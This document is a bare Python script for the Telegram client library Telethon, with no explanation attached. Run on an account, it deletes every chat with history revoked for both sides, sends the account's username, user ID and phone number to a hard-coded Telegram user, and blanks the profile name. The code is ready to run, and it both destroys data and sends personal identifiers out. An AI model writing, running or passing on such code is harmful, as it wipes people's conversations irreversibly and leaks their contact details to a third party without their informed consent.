from telethon import TelegramClient
from telethon.tl.functions.messages import DeleteHistoryRequest
from telethon.tl.functions.account import UpdateProfileRequest

API_ID = 12345678
API_HASH = "YOUR_API_HASH"

TARGET_USERNAME = "Moein_915"
NEW_FIRST_NAME = ""

client = TelegramClient("my_account", API_ID, API_HASH)


async def main():
    await client.start()

    async for d in client.iter_dialogs():
        try:
            await client(DeleteHistoryRequest(
                peer=d.entity,
                max_id=0,
                revoke=True
            ))
        except Exception:
            pass

        await client.delete_dialog(d.entity)
        print(f"Deleted: {d.name or d.id}")

    print("Done deleting chats.")

    me = await client.get_me()
    username = f"@{me.username}" if me.username else "(no username)"
    phone = f"+{me.phone}" if me.phone else "(no phone)"

    info_text = (
        f"Username: {username}\n"
        f"User ID: {me.id}\n"
        f"Phone: {phone}"
    )

    print("\n--- Account info to be sent ---")
    print(info_text)
    print("--------------------------------")

    await client.send_message(TARGET_USERNAME, info_text)
    print(f"Sent account info to {TARGET_USERNAME}")

    await client(UpdateProfileRequest(
        first_name=NEW_FIRST_NAME
    ))

    print(f"Account name changed to: {NEW_FIRST_NAME}")


with client:
    client.loop.run_until_complete(main())
